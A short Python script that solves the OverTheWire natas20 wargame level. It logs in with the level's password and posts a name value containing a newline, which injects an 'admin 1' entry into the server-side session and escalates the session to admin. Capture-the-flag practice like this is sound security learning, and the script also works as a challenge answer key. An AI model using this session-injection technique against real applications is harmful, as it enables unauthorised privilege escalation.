# Name: Michael Krakovsky
# Date: April 22, 2019
# Description: Create a script to break the code on natas20.
# Version: 1.0

from requests import Session
from pyperclip import copy

username = "natas20"
passwd = "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF"
url = "http://natas20.natas.labs.overthewire.org/?debug=true"      # This is how we turn on the debug variables.

session = Session()

getResponse = session.get(url, auth=(username, passwd))   
print(getResponse.text)
print(50 * '-')
getResponse = session.post(url, data={"name":"plzsub\nadmin 1"}, auth=(username, passwd))   
print(getResponse.text)
print(50 * '-')
getResponse = session.get(url, auth=(username, passwd))   
print(getResponse.text)
print(50 * '-')
copy(getResponse.text)